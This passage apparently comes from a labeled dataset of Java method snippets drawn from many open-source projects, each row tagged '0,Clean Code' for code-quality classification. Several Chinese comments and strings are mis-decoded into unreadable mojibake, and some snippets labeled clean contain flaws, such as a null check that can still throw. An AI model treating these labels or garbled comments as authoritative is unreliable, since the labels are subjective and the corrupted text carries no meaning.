    baseFragment.showDialog(limitReachedBottomSheet);
  }
 else {
    limitReachedBottomSheet.show();
  }
  return limitReachedBottomSheet;
}
",0,Clean Code
"/** 
 * Attempt to find a smelting recipe that results in the requested output.
 * @param output The output of the furnace burn
 * @return an ItemStack representing the required input.
 */
public static ItemStack getSmeltingRecipeForRequestedOutput(String output,EntityPlayerMP player){
  ItemStack target=MinecraftTypeHelper.getItemStackFromParameterString(output);
  if (target == null)   return null;
  for (  Map.Entry<ItemStack,ItemStack> e : FurnaceRecipes.instance().getSmeltingList().entrySet()) {
    if (itemStackIngredientsMatch(target,e.getValue()) && playerHasIngredients(player,Collections.singletonList(e.getKey())) && totalBurnTimeInInventory(player) >= smeltingCookingTime) {
      return e.getKey();
    }
  }
  return null;
}
",0,Clean Code
"private boolean reevaluateIfSoundIsOn(){
  if (mSettingsValues == null || !mSettingsValues.mSoundOn || mAudioManager == null) {
    return false;
  }
  return mAudioManager.getRingerMode() == AudioManager.RINGER_MODE_NORMAL;
}
",0,Clean Code
"@Override public Object invoke(Object self,Method originalMethod,Method proxyMethod,Object[] args) throws Throwable {
  String methodName=originalMethod.getName();
  if (methodName.startsWith(""set"") && methodName.length() > 3 && Character.isUpperCase(methodName.charAt(3)) && originalMethod.getParameterCount() == 1) {
    String property=StringUtil.firstCharToLowerCase(originalMethod.getName().substring(3));
    FieldWrapper fw=FieldWrapper.of(originalMethod.getDeclaringClass(),property);
    if (fw != null && fw.isIgnore()) {
      return proxyMethod.invoke(self,args);
    }
    updates.put(fw == null ? property : fw.getField().getName(),args[0]);
  }
  return proxyMethod.invoke(self,args);
}",0,Clean Code
"public static boolean subnetContains(InetAddress subnet,int prefix,InetAddress address){
  int addrlen=subnet.getAddress().length;
  ByteBuffer maskBuf=ByteBuffer.allocate(addrlen);
  for (int i=0; i < addrlen / 4; i++)   maskBuf.putInt(-1);
  BigInteger mask=((new BigInteger(1,maskBuf.array())).shiftRight(prefix)).not();
  BigInteger start=new BigInteger(1,subnet.getAddress()).and(mask);
  BigInteger end=start.add(mask.not());
  BigInteger toCheck=new BigInteger(1,address.getAddress());
  return ((toCheck.compareTo(start) >= 0) && (toCheck.compareTo(end) <= 0));
}
public static boolean subnetContains(String subnet,int prefix,String address){
  try {
    return subnetContains(InetAddress.getByName(subnet),prefix,InetAddress.getByName(address));
  }
 catch (  UnknownHostException ignored) {
    return false;
  }
}",0,Clean Code
"public void update(Service vDom){
  if (!StringUtils.equals(token,vDom.getToken())) {
    Loggers.SRV_LOG.info(""[SERVICE-UPDATE] service: {}, token: {} -> {}"",getName(),token,vDom.getToken());
    token=vDom.getToken();
  }
  if (!ListUtils.isEqualList(owners,vDom.getOwners())) {
    Loggers.SRV_LOG.info(""[SERVICE-UPDATE] service: {}, owners: {} -> {}"",getName(),owners,vDom.getOwners());
    owners=vDom.getOwners();
  }
  if (getProtectThreshold() != vDom.getProtectThreshold()) {
    Loggers.SRV_LOG.info(""[SERVICE-UPDATE] service: {}, protectThreshold: {} -> {}"",getName(),getProtectThreshold(),vDom.getProtectThreshold());
    setProtectThreshold(vDom.getProtectThreshold());
  }
  if (resetWeight != vDom.getResetWeight().booleanValue()) {
    Loggers.SRV_LOG.info(""[SERVICE-UPDATE] service: {}, resetWeight: {} -> {}"",getName(),resetWeight,vDom.getResetWeight());
    resetWeight=vDom.getResetWeight();
  }
  if (enabled != vDom.getEnabled().booleanValue()) {
    Loggers.SRV_LOG.info(""[SERVICE-UPDATE] service: {}, enabled: {} -> {}"",getName(),enabled,vDom.getEnabled());
    enabled=vDom.getEnabled();
  }
  selector=vDom.getSelector();
  setMetadata(vDom.getMetadata());
  updateOrAddCluster(vDom.getClusterMap().values());
  remvDeadClusters(this,vDom);
  recalculateChecksum();
}
",0,Clean Code
"@Override public FileVisitResult visitFile(Path file,BasicFileAttributes attrs) throws IOException {
  if (file.getNameCount() > 2) {
    return super.visitFile(file,attrs);
  }
  addLocaleIfPresent(file,langs,locales);
  return super.visitFile(file,attrs);
}
@Override public FileVisitResult visitFile(Path file,BasicFileAttributes attrs) throws IOException {
  final String filename=file.getFileName().toString().toLowerCase(Locale.ROOT);
  if (addLocaleIfPresent(file,langs,locales)) {
  }
 else   if (filename.endsWith("".jar"") && fileMasks.stream().anyMatch(filename::contains) && Files.isRegularFile(file)&& Files.isReadable(file)) {
    try (FileSystem jarfs=FileSystems.newFileSystem(file,(ClassLoader)null)){
      for (      Path rootPath : jarfs.getRootDirectories()) {
        Files.walkFileTree(rootPath,simpleFileVisitor);
      }
    }
   }
  return super.visitFile(file,attrs);
}",0,Clean Code
"@Test(timeout=3 * TIME_OUT) public void testExportByGroup(){
  String getDataUrl=""?search=accurate&dataId=&group=DEFAULT_GROUP&appName=&config_tags=&pageNo=1&pageSize=10&tenant=&namespaceId="";
  String queryResult=httpClient.get(SERVER_ADDR + CONFIG_CONTROLLER_PATH + getDataUrl,null);
  JSONObject resultObj=JSON.parseObject(queryResult);
  JSONArray resultConfigs=resultObj.getJSONArray(""pageItems"");
  Assert.assertEquals(2,resultConfigs.size());
  JSONObject config1=resultConfigs.getJSONObject(0);
  JSONObject config2=resultConfigs.getJSONObject(1);
  String exportByIdsUrl=""?export=true&tenant=&group=DEFAULT_GROUP&appName=&ids="";
  byte[] zipData=httpClient.download(SERVER_ADDR + CONFIG_CONTROLLER_PATH + exportByIdsUrl,null);
  ZipUtils.UnZipResult unZiped=ZipUtils.unzip(zipData);
  List<ZipUtils.ZipItem> zipItemList=unZiped.getZipItemList();
  Assert.assertEquals(2,zipItemList.size());
  String config1Name=config1.getString(""group"") + ""/"" + config1.getString(""dataId"");
  String config2Name=config2.getString(""group"") + ""/"" + config2.getString(""dataId"");
  for (  ZipUtils.ZipItem zipItem : zipItemList) {
    if (!(config1Name.equals(zipItem.getItemName()) || config2Name.equals(zipItem.getItemName()))) {
      Assert.fail();
    }
  }
  Map<String,String> metaData=processMetaData(unZiped.getMetaDataItem());
  String metaDataName=packageMetaName(""DEFAULT_GROUP"",""testHasAppname1.properties"");
  String appName=metaData.get(metaDataName);
  Assert.assertNotNull(appName);
  Assert.assertEquals(""testApp1"",appName);
}",0,Clean Code
"@NonNull public static RichInputMethodSubtype getNoLanguageSubtype(){
  RichInputMethodSubtype noLanguageSubtype=sNoLanguageSubtype;
  if (noLanguageSubtype == null) {
    final InputMethodSubtype rawNoLanguageSubtype=RichInputMethodManager.getInstance().findSubtypeByLocaleAndKeyboardLayoutSet(LocaleUtils.constructLocale(SubtypeLocaleUtils.NO_LANGUAGE),SubtypeLocaleUtils.QWERTY);
    if (rawNoLanguageSubtype != null) {
      noLanguageSubtype=new RichInputMethodSubtype(rawNoLanguageSubtype);
    }
  }
  if (noLanguageSubtype != null) {
    sNoLanguageSubtype=noLanguageSubtype;
    return noLanguageSubtype;
  }
  Log.w(TAG,""Can't find any language with QWERTY subtype"");
  Log.w(TAG,""No input method subtype found; returning dummy subtype: "" + DUMMY_NO_LANGUAGE_SUBTYPE);
  return DUMMY_NO_LANGUAGE_SUBTYPE;
}
",0,Clean Code
"private void drawBackground(Canvas canvas,RectF rectF,float r,float alpha,View view){
  if (keyboardT > 0 && blurPaint != null && blurBitmapShader != null && blurBitmap != null && !blurBitmap.isRecycled()) {
    blurBitmapMatrix.reset();
    blurBitmapMatrix.postScale((float)rootView.getWidth() / blurBitmap.getWidth(),(float)rootView.getHeight() / blurBitmap.getHeight());
    float x=0, y=0;
    for (int i=0; i < 8 && view != null; ++i) {
      x+=view.getX();
      y+=view.getY();
      ViewParent parent=view.getParent();
      view=parent instanceof View ? (View)parent : null;
    }
    blurBitmapMatrix.postTranslate(-x,-y);
    blurBitmapShader.setLocalMatrix(blurBitmapMatrix);
    blurPaint.setAlpha((int)(0xFF * keyboardT * alpha));
    canvas.drawRoundRect(rectF,r,r,blurPaint);
  }
  backgroundPaint.setAlpha((int)(blurPaint == null ? 0x80 : lerp(0x80,0x99,keyboardT) * alpha));
  canvas.drawRoundRect(rectF,r,r,backgroundPaint);
}",0,Clean Code
"@Override public String getQueryPlan(String selectStr,CockroachDBGlobalState globalState) throws Exception {
  String queryPlan="""";
  String explainQuery=""EXPLAIN (OPT) "" + selectStr;
  if (globalState.getOptions().logEachSelect()) {
    globalState.getLogger().writeCurrent(explainQuery);
    try {
      globalState.getLogger().getCurrentFileWriter().flush();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
  SQLQueryAdapter q=new SQLQueryAdapter(explainQuery);
  boolean afterProjection=false;
  try (SQLancerResultSet rs=q.executeAndGet(globalState)){
    if (rs != null) {
      while (rs.next()) {
        String targetQueryPlan=rs.getString(1).replace(""鈹斺攢鈹�"","""").replace(""鈹溾攢鈹�"","""").replace(""鈹�"","""").trim() + "";"";
        if (afterProjection) {
          afterProjection=false;
          continue;
        }
        if (targetQueryPlan.startsWith(""projections"")) {
          afterProjection=true;
        }
        if (targetQueryPlan.contains("">"") || targetQueryPlan.contains(""<"") || targetQueryPlan.contains(""="")|| targetQueryPlan.contains(""*"")|| targetQueryPlan.contains(""+"")|| targetQueryPlan.contains(""'"")) {
          continue;
        }
        queryPlan+=targetQueryPlan;
      }
    }
  }
 catch (  AssertionError e) {
    throw new AssertionError(""Explain failed: "" + explainQuery);
  }
  return queryPlan;
}",0,Clean Code
"/** 
 * Returns the child CellLayout if the point is inside the page coordinates, null otherwise.
 */
private CellLayout verifyInsidePage(int pageNo,float x,float y){
  if (pageNo >= 0 && pageNo < getPageCount()) {
    CellLayout cl=(CellLayout)getChildAt(pageNo);
    if (x >= cl.getLeft() && x <= cl.getRight() && y >= cl.getTop() && y <= cl.getBottom()) {
      return cl;
    }
  }
  return null;
}",0,Clean Code
"@Override protected void onLayout(boolean changed,int left,int top,int right,int bottom){
  if (mUnlockWallpaperFromDefaultPageOnLayout) {
    mWallpaperOffset.setLockToDefaultPage(false);
    mUnlockWallpaperFromDefaultPageOnLayout=false;
  }
  if (mFirstLayout && mCurrentPage >= 0 && mCurrentPage < getChildCount()) {
    mWallpaperOffset.syncWithScroll();
    mWallpaperOffset.jumpToFinal();
  }
  super.onLayout(changed,left,top,right,bottom);
  updatePageAlphaValues();
}",0,Clean Code
"@Override public CharSequence apply(IN input,Schema<IN,?> schema){
  return apply(input,schema,0);
}
@Override public CharSequence apply(IN input,Schema<IN,?> schema,long rowId){
  Field<?,? extends CharSequence>[] fields=(Field<?,? extends CharSequence>[])schema.getFields();
  if (fields.length == 0) {
    return EMPTY_RESULT;
  }
  if (withBatchMode) {
    if (rowId == 0 || batchSize > 0 && rowId % batchSize == 0) {
      return SqlDialect.getFirstRow(dialect,() -> appendTableInfo(fields),() -> addValues(input,fields),keywordCase);
    }
 else {
      return String.join(LINE_SEPARATOR,"","",SqlDialect.getOtherRow(dialect,() -> appendTableInfo(fields),() -> addValues(input,fields),keywordCase));
    }
  }
 else {
    return String.join("" "",INSERT_INTO.getValue(keywordCase),appendTableInfo(fields),VALUES.getValue(keywordCase),addValues(input,fields));
  }
}",0,Clean Code
"/** 
 * Returns the writeReplace method
 */
protected static Method getWriteReplace(Class<?> cl,Class<?> param){
  for (; cl != null; cl=cl.getSuperclass()) {
    for (    Method method : cl.getDeclaredMethods()) {
      if (method.getName().equals(""writeReplace"") && method.getParameterTypes().length == 1 && param.equals(method.getParameterTypes()[0]))       return method;
    }
  }
  return null;
}
/** 
 * Returns the writeReplace method
 */
protected static Method getWriteReplace(Class<?> cl){
  for (; cl != null; cl=cl.getSuperclass()) {
    Method[] methods=cl.getDeclaredMethods();
    for (int i=0; i < methods.length; i++) {
      Method method=methods[i];
      if (method.getName().equals(""writeReplace"") && method.getParameterTypes().length == 0)       return method;
    }
  }
  return null;
}",0,Clean Code
"public static Scan scan(BufferedImage bufferedImage){
  try {
    BufferedImage grayscale=new BufferedImage(bufferedImage.getWidth(),bufferedImage.getHeight(),BufferedImage.TYPE_BYTE_GRAY);
    Graphics2D g2d=(Graphics2D)grayscale.getGraphics();
    g2d.drawImage(bufferedImage,0,0,null);
    g2d.dispose();
    byte[] data=convertToY800(grayscale);
    try (Image image=new Image()){
      image.setSize(grayscale.getWidth(),grayscale.getHeight());
      image.setFormat(""Y800"");
      image.setData(data);
      try (ImageScanner scanner=new ImageScanner()){
        scanner.setConfig(Symbol.NONE,Config.ENABLE,0);
        scanner.setConfig(Symbol.QRCODE,Config.ENABLE,1);
        int result=scanner.scanImage(image);
        if (result != 0) {
          try (SymbolSet results=scanner.getResults()){
            Scan scan=null;
            for (Iterator<Symbol> iter=results.iterator(); iter.hasNext(); ) {
              try (Symbol symbol=iter.next()){
                scan=new Scan(getRawBytes(symbol.getData()),symbol.getData());
              }
             }
            return scan;
          }
         }
      }
     }
   }
 catch (  Exception e) {
    log.debug(""Error scanning with ZBar"",e);
  }
  return null;
}
public record Scan(byte[] rawData,String stringData){
}",0,Clean Code
"public static double dp2(int N,int M,int K){
  if (N < 1 || M < 1 || K < 1) {
    return 0;
  }
  long all=(long)Math.pow(M + 1,K);
  long[][] dp=new long[K + 1][N + 1];
  dp[0][0]=1;
  for (int times=1; times <= K; times++) {
    dp[times][0]=(long)Math.pow(M + 1,times);
    for (int hp=1; hp <= N; hp++) {
      dp[times][hp]=dp[times][hp - 1] + dp[times - 1][hp];
      if (hp - 1 - M >= 0) {
        dp[times][hp]-=dp[times - 1][hp - 1 - M];
      }
 else {
        dp[times][hp]-=Math.pow(M + 1,times - 1);
      }
    }
  }
  long kill=dp[K][N];
  return (double)((double)kill / (double)all);
}",0,Clean Code
"@Override @NonNull public String toString(){
  return toString(0,false);
}
public String toString(final int indentCount,final boolean plumbing){
  final StringBuilder indent=new StringBuilder();
  if (plumbing) {
    indent.append(""H:"");
  }
 else {
    for (int i=0; i < indentCount; ++i) {
      indent.append("" "");
    }
  }
  final StringBuilder s=new StringBuilder();
  for (  final String optionKey : mAttributes.keySet()) {
    s.append(indent);
    s.append(optionKey);
    s.append("" = "");
    if (""date"".equals(optionKey) && !plumbing) {
      s.append(new Date(1000 * Long.parseLong(mAttributes.get(optionKey))));
    }
 else {
      s.append(mAttributes.get(optionKey));
    }
    s.append(""\n"");
  }
  return s.toString();
}",0,Clean Code
"/** 
 * Assert that the given text does not contain the given substring. <pre class=""code"">Assert.doesNotContain(name, ""rod"", ""Name must not contain 'rod'"");</pre>
 * @param textToSearch the text to search
 * @param substring the substring to find within the text
 * @param message the exception message to use if the assertion fails
 */
public static void doesNotContain(String textToSearch,String substring,String message){
  if (StringUtils.hasLength(textToSearch) && StringUtils.hasLength(substring) && textToSearch.indexOf(substring) != -1) {
    throw new IllegalArgumentException(message);
  }
}
/** 
 * Assert that the given text does not contain the given substring. <pre class=""code"">Assert.doesNotContain(name, ""rod"");</pre>
 * @param textToSearch the text to search
 * @param substring the substring to find within the text
 */
public static void doesNotContain(String textToSearch,String substring){
  doesNotContain(textToSearch,substring,""[Assertion failed] - this String argument must not contain the substring ["" + substring + ""]"");
}",0,Clean Code
"/** 
 * Returns the path itself if a directory exists at it and is readable, otherwise returns {@link TermuxPropertyConstants#DEFAULT_IVALUE_DEFAULT_WORKING_DIRECTORY}.
 * @param path The {@link String} path to check.
 * @return Returns the internal value for value.
 */
public static String getDefaultWorkingDirectoryInternalPropertyValueFromValue(String path){
  if (path == null || path.isEmpty())   return TermuxPropertyConstants.DEFAULT_IVALUE_DEFAULT_WORKING_DIRECTORY;
  File workDir=new File(path);
  if (!workDir.exists() || !workDir.isDirectory() || !workDir.canRead()) {
    Logger.logError(LOG_TAG,""The path \"""" + path + ""\"" for the key \""""+ TermuxPropertyConstants.KEY_DEFAULT_WORKING_DIRECTORY+ ""\"" does not exist, is not a directory or is not readable. Using default value \""""+ TermuxPropertyConstants.DEFAULT_IVALUE_DEFAULT_WORKING_DIRECTORY+ ""\"" instead."");
    return TermuxPropertyConstants.DEFAULT_IVALUE_DEFAULT_WORKING_DIRECTORY;
  }
 else {
    return path;
  }
}
",0,Clean Code
"public LocalFileHeader getNextEntry() throws IOException {
  return getNextEntry(null,true);
}
public LocalFileHeader getNextEntry(FileHeader fileHeader,boolean readUntilEndOfCurrentEntryIfOpen) throws IOException {
  if (localFileHeader != null && readUntilEndOfCurrentEntryIfOpen) {
    readUntilEndOfEntry();
  }
  localFileHeader=headerReader.readLocalFileHeader(inputStream,zip4jConfig.getCharset());
  if (localFileHeader == null) {
    return null;
  }
  if (localFileHeader.isEncrypted() && password == null && passwordCallback != null) {
    setPassword(passwordCallback.getPassword());
  }
  verifyLocalFileHeader(localFileHeader);
  crc32.reset();
  if (fileHeader != null) {
    localFileHeader.setCrc(fileHeader.getCrc());
    localFileHeader.setCompressedSize(fileHeader.getCompressedSize());
    localFileHeader.setUncompressedSize(fileHeader.getUncompressedSize());
    localFileHeader.setDirectory(fileHeader.isDirectory());
    canSkipExtendedLocalFileHeader=true;
  }
 else {
    canSkipExtendedLocalFileHeader=false;
  }
  this.decompressedInputStream=initializeEntryInputStream(localFileHeader);
  this.entryEOFReached=false;
  return localFileHeader;
}",0,Clean Code
"private void updateBackgroundImage(){
  if (contentView.getMeasuredWidth() == 0 || contentView.getMeasuredHeight() == 0 || backgroundView == null || backgroundView.imageView == null) {
    return;
  }
  if (whiteBackground) {
    Bitmap bitmap=Bitmap.createBitmap(50,50,Bitmap.Config.ARGB_8888);
    Canvas canvas=new Canvas(bitmap);
    canvas.drawColor(ColorUtils.blendARGB(getThemedColor(Theme.key_premiumGradient2),getThemedColor(Theme.key_dialogBackground),0.5f));
    backgroundView.imageView.setBackgroundBitmap(bitmap);
  }
 else {
    gradientTools.gradientMatrix(0,0,contentView.getMeasuredWidth(),contentView.getMeasuredHeight(),0,0);
    gradientCanvas.save();
    gradientCanvas.scale(100f / contentView.getMeasuredWidth(),100f / contentView.getMeasuredHeight());
    gradientCanvas.drawRect(0,0,contentView.getMeasuredWidth(),contentView.getMeasuredHeight(),gradientTools.paint);
    gradientCanvas.restore();
    backgroundView.imageView.setBackgroundBitmap(gradientTextureBitmap);
  }
}",0,Clean Code
"public static int maxValue(int[] w,int[] v,int bag){
  if (w == null || v == null || w.length != v.length || w.length == 0) {
    return 0;
  }
  return process(w,v,0,bag);
}",0,Clean Code
"private Result<ConnectorMetrics> getConnectorTaskMetricsAvg(VersionItemParam metricParam){
  ConnectorMetricParam param=(ConnectorMetricParam)metricParam;
  Long connectClusterId=param.getConnectClusterId();
  String connectorName=param.getConnectorName();
  String metric=param.getMetricName();
  ConnectorTypeEnum connectorType=param.getConnectorType();
  Result<List<ConnectorTaskMetrics>> ret=this.getConnectorTaskMetricList(connectClusterId,connectorName,metric,connectorType);
  if (ret == null || !ret.hasData() || ret.getData().isEmpty()) {
    return Result.buildFailure(NOT_EXIST);
  }
  Float sum=ret.getData().stream().map(elem -> elem.getMetric(metric)).reduce(Float::sum).get();
  return Result.buildSuc(new ConnectorMetrics(connectClusterId,connectorName,metric,sum / ret.getData().size()));
}
",0,Clean Code
"/** 
 * Attempts to read the remainder of the frame. <p> If a frame is read in full then true is returned. The frame will have been output, and the position of the source will have been advanced to the byte that immediately follows the end of the frame. <p> If a frame is not read in full then the position of the source will have been advanced to the limit, and the method should be called again with the next source to continue the read.
 * @param source The source from which to read.
 */
private void readFrameRemainder(ParsableByteArray source){
  int bytesToRead=Math.min(source.bytesLeft(),frameSize - frameBytesRead);
  output.sampleData(source,bytesToRead);
  frameBytesRead+=bytesToRead;
  if (frameBytesRead < frameSize) {
    return;
  }
  output.sampleMetadata(timeUs,C.BUFFER_FLAG_KEY_FRAME,frameSize,0,null);
  timeUs+=frameDurationUs;
  frameBytesRead=0;
  state=STATE_FINDING_HEADER;
}",0,Clean Code
"@Override public boolean sendMessageToApp(ChannelInfo clientChannelInfo,String appInstanceId,WebSocketFrame message){
  String workspaceId=clientChannelInfo.getWorkspaceId();
  String sessionId=SessionService.getAppSessionId(appInstanceId);
  ChannelInfo channelInfo=sessionService.getSession(workspaceId,sessionId);
  if (channelInfo == null) {
    LOGGER.error(""ChannelInfo is null for given workspaceId {} and appInstanceId {}"",workspaceId,appInstanceId);
    message.release();
    return false;
  }
  logDebug(""ChannelInfo workspaceId {} and parameter workspaceId {}"",channelInfo.workspaceId,workspaceId);
  if (workspaceId.equals(channelInfo.workspaceId)) {
    logDebug(""ChannelInfo workspaceId and parameter workspaceId is same"");
    channelInfo.channel.writeAndFlush(message);
    logDebug(""The request has been sent successfully with id {}"",appInstanceId);
    return true;
  }
 else {
    logDebug(""ChannelInfo workspaceId and parameter workspaceId is different"");
    message.release();
    logDebug(""The request could not be sent"");
    return false;
  }
}
",0,Clean Code
"public void createUser2(String name){
  List<Runnable> list=new ArrayList<>();
  list.add(() -> userRepository.save(new UserEntity(name,""[1]"")));
  try {
    TimeUnit.SECONDS.sleep(2);
  }
 catch (  InterruptedException ignore) {
  }
  list.add(() -> {
    userRepository.save(new UserEntity(name,""[2]""));
    if (name.equals(""error""))     throw new RuntimeException(""error"");
  }
);
  transactionTemplate.setName(""createUser2"");
  transactionTemplate.executeWithoutResult(s -> list.forEach(Runnable::run));
}",0,Clean Code
"/** 
 * 鎵ц鍒嗙被娣诲姞鎴栨洿鏂版搷浣滐細鏍￠獙鍙傛暟鏄惁鍚堟硶锛屽垎绫绘槸鍚﹀凡瀛樺湪
 * @param category 鍒嗙被瀹炰綋
 * @param type     娣诲姞鎴栨洿鏂�
 * @return
 */
private Result getResult(Category category,String type){
  if (StringUtils.isEmpty(category.getName())) {
    return Result.error(""鍒嗙被鍚嶇О涓嶈兘涓虹┖"");
  }
  Category category1=categoryService.getCategoryByName(category.getName());
  if (category1 != null && !category1.getId().equals(category.getId())) {
    return Result.error(""璇ュ垎绫诲凡瀛樺湪"");
  }
  if (""save"".equals(type)) {
    categoryService.saveCategory(category);
    return Result.ok(""鍒嗙被娣诲姞鎴愬姛"");
  }
 else {
    categoryService.updateCategory(category);
    return Result.ok(""鍒嗙被鏇存柊鎴愬姛"");
  }
}",0,Clean Code
"private static HotKeySet parseHotKeys(@NonNull final Resources resources,final int resourceId){
  final HotKeySet keySet=new HotKeySet();
  final String name=resources.getResourceEntryName(resourceId);
  final String[] values=resources.getStringArray(resourceId);
  for (int i=0; values != null && i < values.length; i++) {
    String[] valuePair=values[i].split("","");
    if (valuePair.length != 2) {
      Log.w(TAG,""Expected 2 integers in "" + name + ""[""+ i+ ""] : ""+ values[i]);
    }
    try {
      final int keyCode=Integer.parseInt(valuePair[0]);
      final int metaState=Integer.parseInt(valuePair[1]);
      final Pair<Integer,Integer> key=Pair.create(keyCode,KeyEvent.normalizeMetaState(metaState));
      keySet.add(key);
    }
 catch (    NumberFormatException e) {
      Log.w(TAG,""Failed to parse "" + name + ""[""+ i+ ""] : ""+ values[i],e);
    }
  }
  return keySet;
}",0,Clean Code
"private static boolean hasFixedSize(int type){
  if (type == TYPE_PIN_DIALOGS || type == TYPE_FOLDERS || type == TYPE_CHATS_IN_FOLDER || type == TYPE_LARGE_FILE || type == TYPE_ACCOUNTS) {
    return true;
  }
  return false;
}
",0,Clean Code
"/** 
 * Fill in detailed information
 * @param list
 */
public void fillDetail(List<Team> list){
  if (CollectionUtils.isEmpty(list)) {
    return;
  }
  List<Long> idList=EasyCollectionUtils.toList(list,Team::getId);
  List<Team> queryList=teamService.listQuery(idList).getData();
  Map<Long,Team> queryMap=EasyCollectionUtils.toIdentityMap(queryList,Team::getId);
  for (  Team data : list) {
    if (data == null || data.getId() == null) {
      continue;
    }
    Team query=queryMap.get(data.getId());
    add(data,query);
  }
}
",0,Clean Code
"private String nextFileNameOfDay(long time){
  List<String> list=new ArrayList<>();
  File baseFile=new File(baseDir);
  DateFormat fileNameDf=new SimpleDateFormat(""yyyy-MM-dd"");
  String dateStr=fileNameDf.format(new Date(time));
  String fileNameModel=baseFileName + ""."" + dateStr;
  for (  File file : Objects.requireNonNull(baseFile.listFiles())) {
    String fileName=file.getName();
    if (fileName.contains(fileNameModel) && !fileName.endsWith(METRIC_FILE_INDEX_SUFFIX) && !fileName.endsWith("".lck"")) {
      list.add(file.getAbsolutePath());
    }
  }
  Collections.sort(list,METRIC_FILE_NAME_CMP);
  if (list.isEmpty()) {
    return baseDir + fileNameModel;
  }
  String last=list.get(list.size() - 1);
  int n=0;
  String[] strs=last.split(""\\."");
  if (strs.length > 0 && strs[strs.length - 1].matches(""[0-9]{1,10}"")) {
    n=Integer.parseInt(strs[strs.length - 1]);
  }
  return baseDir + fileNameModel + "".""+ (n + 1);
}",0,Clean Code
"protected String formatFiatValue(Double value){
  UnitFormat format=Config.get().getUnitFormat();
  if (format == null) {
    format=UnitFormat.DOT;
  }
  CurrencyRate currencyRate=AppServices.getFiatCurrencyExchangeRate();
  if (currencyRate != null && currencyRate.isAvailable() && value > 0) {
    Currency currency=currencyRate.getCurrency();
    return currency.getSymbol() + "" "" + format.formatCurrencyValue(value);
  }
 else {
    return """";
  }
}",0,Clean Code
"/** 
 * 娣诲姞鏃ュ織鍙戦�佹秷鎭�
 * @author zhangzhiwei
 */
private void addOaLogSendMessage(AdminMessageEnum messageEnum,Integer typeId,Long userId,List<Long> ids){
  List<AdminMessage> messageList=new ArrayList<>();
  ids.forEach(id -> {
    AdminMessage adminMessage=new AdminMessage();
    adminMessage.setCreateTime(new Date());
    adminMessage.setCreateUser(userId);
    adminMessage.setType(messageEnum.getType());
    adminMessage.setLabel(messageEnum.getLabel());
    adminMessage.setTitle(DateUtil.today());
    adminMessage.setRecipientUser(id);
    adminMessage.setTypeId(typeId);
    messageList.add(adminMessage);
  }
);
  saveBatch(messageList);
}
",0,Clean Code
"/** 
 * Draws a pixel data sub-block, as defined by ETSI EN 300 743 7.2.5.1, into a canvas.
 */
private static void paintPixelDataSubBlocks(ObjectData objectData,ClutDefinition clutDefinition,int regionDepth,int horizontalAddress,int verticalAddress,Paint paint,Canvas canvas){
  int[] clutEntries;
  if (regionDepth == REGION_DEPTH_8_BIT) {
    clutEntries=clutDefinition.clutEntries8Bit;
  }
 else   if (regionDepth == REGION_DEPTH_4_BIT) {
    clutEntries=clutDefinition.clutEntries4Bit;
  }
 else {
    clutEntries=clutDefinition.clutEntries2Bit;
  }
  paintPixelDataSubBlock(objectData.topFieldData,clutEntries,regionDepth,horizontalAddress,verticalAddress,paint,canvas);
  paintPixelDataSubBlock(objectData.bottomFieldData,clutEntries,regionDepth,horizontalAddress,verticalAddress + 1,paint,canvas);
}",0,Clean Code
"static boolean same2(Object a,Object b){
  if ((null == a && null == b) || a.equals(b))   return true;
 else   return false;
}",0,Clean Code
"public void checkDialogMessages(long dialogId){
  if (!isFeatureAvailable()) {
    return;
  }
  getMessagesStorage().getStorageQueue().postRunnable(() -> {
    final ArrayList<MessageObject> dialogMessages=messagesController.dialogMessage.get(dialogId);
    if (dialogMessages == null) {
      return;
    }
    ArrayList<TLRPC.Message> customProps=new ArrayList<>();
    for (int i=0; i < dialogMessages.size(); ++i) {
      MessageObject dialogMessage=dialogMessages.get(i);
      if (dialogMessage == null || dialogMessage.messageOwner == null) {
        customProps.add(null);
        continue;
      }
      customProps.add(getMessagesStorage().getMessageWithCustomParamsOnlyInternal(dialogMessage.getId(),dialogMessage.getDialogId()));
    }
    AndroidUtilities.runOnUIThread(() -> {
      boolean updated=false;
      for (int i=0; i < Math.min(customProps.size(),dialogMessages.size()); ++i) {
        MessageObject dialogMessage=dialogMessages.get(i);
        TLRPC.Message props=customProps.get(i);
        if (dialogMessage == null || dialogMessage.messageOwner == null || props == null) {
          continue;
        }
        dialogMessage.messageOwner.translatedText=props.translatedText;
        dialogMessage.messageOwner.translatedToLanguage=props.translatedToLanguage;
        if (dialogMessage.updateTranslation(false)) {
          updated=true;
        }
      }
      if (updated) {
        NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.updateInterfaces,0);
      }
    }
);
  }
);
}",0,Clean Code
"/** 
 * Utility method for evaluating the prepared statement as a query to check the existence of a record using a numeric count or boolean return value. <p>The  {@link #rawQuery} provided must result in a {@link Number} or {@link Boolean} result.
 * @return {@literal true} If a count query returned more than 0 or an exists query returns{@literal true}.
 * @throws NonTransientException If an unexpected return type cannot be evaluated to a {@code Boolean} result.
 */
public boolean exists(){
  Object val=executeScalar();
  if (null == val) {
    return false;
  }
  if (val instanceof Number) {
    return convertLong(val) > 0;
  }
  if (val instanceof Boolean) {
    return (Boolean)val;
  }
  if (val instanceof String) {
    return convertBoolean(val);
  }
  throw new NonTransientException(""Expected a Numeric or Boolean scalar return value from the query, received "" + val.getClass().getName());
}",0,Clean Code
"/** 
 * 鑾峰彇涓�涓仴搴风殑Instance
 * @throws Exception
 */
@Test public void selectOneHealthyInstances() throws Exception {
  String serviceName=randomDomainName();
  naming.registerInstance(serviceName,""127.0.0.1"",TEST_PORT);
  naming.registerInstance(serviceName,""127.0.0.1"",60000);
  TimeUnit.SECONDS.sleep(2);
  Instance instance=naming.selectOneHealthyInstance(serviceName);
  List<Instance> instancesGet=naming.getAllInstances(serviceName);
  for (  Instance instance1 : instancesGet) {
    if (instance1.getIp().equals(instance.getIp()) && instance1.getPort() == instance.getPort()) {
      Assert.assertTrue(instance.isHealthy());
      Assert.assertTrue(verifyInstance(instance1,instance));
      return;
    }
  }
  Assert.fail();
}",0,Clean Code
"public Map<String,Boolean> getConfPartMetaInfo(){
  Map<String,Boolean> configMap=new HashMap<>();
  for (  Map.Entry<String,Tuple2<Partition,Integer>> entry : configuredPartInfoMap.entrySet()) {
    if (entry == null || entry.getKey() == null || entry.getValue() == null) {
      continue;
    }
    configMap.put(entry.getKey(),(entry.getValue().getF1() == 1));
  }
  return configMap;
}",0,Clean Code
"/** 
 * 娣诲姞涓婄骇骞冲彴淇℃伅
 * @param parentPlatform
 * @return
 */
